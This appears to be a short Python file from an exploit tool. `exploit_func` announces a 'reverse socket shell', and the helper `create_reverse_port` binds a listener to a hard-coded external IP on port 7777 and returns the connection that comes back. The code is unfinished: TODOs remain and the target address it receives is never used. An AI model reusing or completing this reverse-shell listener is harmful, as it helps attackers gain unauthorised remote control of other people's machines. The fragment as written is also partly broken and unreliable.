import socket


def create_reverse_port(target_ip, target_port):
    # TODO: Get ip host
    g_connectback_ip = "95.179.152.63"
    # TODO: Generate random port
    g_connectback_port = 7777

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((g_connectback_ip, g_connectback_port))
    sock.listen(1)
    conn, _ = sock.accept()
    sock.close()
    return conn


def exploit_func(ip, port):
    print("Creating reverse socket shell --- ip: {}, port: {}".format(ip, port))
    return create_reverse_port(ip, port)
